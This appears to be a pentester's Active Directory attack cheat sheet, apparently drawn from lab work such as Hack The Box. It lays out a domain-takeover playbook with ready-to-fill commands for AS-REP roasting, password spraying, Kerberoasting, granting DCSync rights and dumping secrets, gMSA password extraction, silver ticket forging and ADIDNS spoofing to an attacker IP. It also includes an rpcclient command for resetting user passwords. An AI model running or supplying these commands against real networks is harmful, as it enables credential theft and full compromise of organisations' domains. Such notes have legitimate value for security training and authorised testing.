## First and foremost
To start enumerating the active directory forest we need to have some kind of shell in the network, which can be claimed by any means. Web, SSH, etc.

But if all fails then what we have is kerberos and dns enumerations.
We can find number of machines in the DOMAIN and their IP addresses using dig and nslookup

If a user in the AD setting has the setting "Do not require Kerberos preauthentication" or UF_DONT_REQUIRE_PREAUTH set to true and we have its username then we can ask the kdc for a TGT which is encrpyted with the user's NTLM hash, which we can then crack in offline mode to get the user's password.
So, in order to get usernames we can use rpcclient to enumerate groups and users in the domain using a null rpc session using `rpcclient -U "" -N IP` and then doing
* `enumdomusers` for enumerating users 
* `queryuser RID` to query information about the user having the RID
* `enumdomgroups` to enumerate groups
* `enumprivs` to enumerate privileges
* `netshareenumall` to enumerate all shares
* `enumprinters` to enumerate printers
* `setuserinfo2` to reset the password of the user
* `lsaquery` to get domain SID
* `querydominfo` to get information on the domain
* `lsaenumsid` to get SID's of users

If with these means we do not get usernames then we need to recon the web app or need to adopt other means of getting usernames

After we do get list of usernames, we can make a wordlist out of it and use GETNPUsers.py from impacket to get TGT's of the users having the misconfig using `GETNPUsers.py DOMAIN NAME -dc-ip DOMAIN CONTROLLER IP -no-pass -userfile WORDLIST`

Then after getting TGT's we try to crack them to get clear text passwords which we can use to get a shell through either winrm, ssh or whatever services enable us to

If we do not get any TGT's, but instead get a password then we can user kerbrute to check bruteforce usernames with the passwords with the kdc or we can even use crackmapexec in different modes like, smb to see if we can get any hits on any usernames. The syntax should be as follows `crackmapexec smb 'IP ADDRESS HERE' -u 'USER WORDLIST HERE' -p 'PASSWORD HERE'`

## Second
We transfer sharphound.exe to our victim. Sharphound is a data collector tool(ingestor) for bloodhound. Bloodhound is a visualizer of the AD network and enables us to analyze it better.
If we are using evilwinrm then after loading sharphound in the powershell session, we can find the command by using `menu` on the evilwinrm shell, which is `Invoke-Bloodhound`.

Another way of getting a bloodhound ingestor to work is remotely through bloodhound-python package which needs credentials of the user. The python script can be found here https://github.com/fox-it/BloodHound.py, via the following command `bloodhound-python -u "USERNAME@DOMAIN" -p PASSWORD -c All -d "DOMAIN NAME" -dc "DOMAIN CONTROLLER NAME" -ns "NAME SERVER IP" --zip`.

After transfering the zip to our machine we can import the zip to bloodhound which will make us a graph of the network and will also graph the permissions, groups, everything. It even gives us hints as to what to exploit to reach what target.

## Third
Check for any ServicePrinicipalNames(SPNs) of other users from which we can extract a kerberos silver ticket and then try cracking it to get credentials. To get SPNs and silver ticket we need the following command `GetUserSPNs.py -request -dc-ip DomainControllerIP Domain/Username:Password`.

## Fourth
If the Link says MemberOf, then we can disregard it, why? we can read that using right clicking on the link.

### GenericWrite (GenericAll)
If the Link says GenericAll, then we can just add the group to our user by simply doing `net group "GROUP NAME" USERNAME /add /domain` and get the elevated perms given to the group we just added ourselves to

### WriteDacl

If the Link says WriteDacl and the abuse info says that we can do a dcsync attack then we can simply type this oneliner `Add-DomainGroupMember -Identity 'GROUP NAME' -Members USERNAME; $username = "HOSTNAME\USERNAME"; $password = "PASSWORD"; $secstr = New-Object -TypeName System.Security.SecureString; $password.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}; $cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $username, $secstr; Add-DomainObjectAcl -Credential $Cred -PrincipalIdentity 'USERNAME' -TargetIdentity 'DOMAINNAME\Domain Admins' -Rights DCSync`.

And after that simply use secretsdump.py from impacket to get kerberos golden tickets of the accounts due to the nature of DCSync attack by using `secretsdump.py USERNAME:PASSWORD@DC IP`

### ReadGMSAPassword

If our owned user(AD object) has ReadGMSAPassword privelage for a GMSA(Group Managed Service Account), then usually its a high value target, due to as follows https://cube0x0.github.io/Relaying-for-gMSA/, so understanding this article, we see sometimes the GMSA is usually granted more rights than what it needs, hence it is in our best interest to own them. The article describes on how to do it if you have a shell with the account. But in intelligence from htb, we didnt have shell, so we used ldapsearch to gain info on it, using the following syntax `ldapsearch -x -b "DISTINGUISHED NAME OF THE TARGET GMSA RETRIEVED FROM BLOODHOUND" -H "ldap://DC IP" -D "DISTINGUISHED NAME OF THE OWNED ACCOUNT WHICH HAS THE RIGHTS" -w "PASSWORD OF THE OWNED ACCOUNT" "objectclass=*"`. and do get NT password hash we can use the gmsadump.py which can be found here https://github.com/micahvandeusen/gMSADumper, via the following command `python3 gmsadumper.py -u 'USERNAME' -p 'PASSWORD' -d <DOMAIN CONTROLLER DOMAIN NAME(NOT IP)>`.

## Lastly
The 2nd part of the golden ticket will be the hash required for a pass the hash attack, which we may use to get access via evilwinrm or we might try to crack it, to get cleartext passwords

If we have own a service which has some delegation to the DC then we can forge a silver ticket with that user's NT HASH and impersonate any user on the DC for the partcular SPN which the user has rights to. For that we can make a silver ticket by the following `ticketer.py <TARGET USER> -nthash <NT HASH OF USER> -domain <DOMAIN NAME> -user <CURRENT USER> -domain-sid <DOMAIN SID> -spn <SERVICE/DOMAIN>`. We can get the domain sid by `lookupsid.py '<WORKGROUP/USERNAME:PASSWORD@DOMAIN NAME>`'. After that we export the ticket as follows `export KRB5CCNAME=SOMETHING.ccache`. Now we have our environment ready to use this silver ticket to authenticate to the server by impersonating other user on DC.

## Note
1. Earlier there was something called as Group Policy Preferences in windows AD which enabled administrators to easily change settings, credentials, etc. using a GPP, but the service which was used had its credentials stored in an xml file in the SYSVOL directory in `\DOMAIN\Policies\{SOME UUID CODE idk what}\MACHINE\Preference\Groups` called Groups.xml. But the credentials were stored in clear text only encryped with an AES 32 byte key, but the bug was that the SYSVOL share was world readable for all the users in the domain, hence anyone could get the encrypted password, crack it and get privelages. Hence this service was disabled by microsoft in 2014 in its advisory ms14-025, but old systems still might have them.

2. Windows AD's also have an inbuilt DNS db called ADIDNS, in which by default any "authenticated user" can add records using ldap (provided that record doesnt already exist in it, more on that here https://www.netspi.com/blog/technical/network-penetration-testing/exploiting-adidns/). So if you want to add DNS records in the ADIDNS db then first u need to check if record with the same name already exists or not. This is done by using the follows `python3 dnstool.py -u 'DOMAIN\USERNAME' -p 'PASSWORD' --record 'DNS RECORD NAME' --action 'query' <DC IP>`, after that, if there already exists a record, and you are simply a low prived user then there is nothing you can do. But if there is no IP assosiated with that DNS Record then you can add your own IP to that Record, by the following `python3 dnstool.py -u 'DOMAIN\USERNAME'-p 'PASSWORD' --record 'DNS RECORD NAME' --action 'add' --data <ATTACKER IP> <DC IP>` more on that, here https://www.thehacker.recipes/ad/movement/mitm-and-coerced-authentications/adidns-spoofing
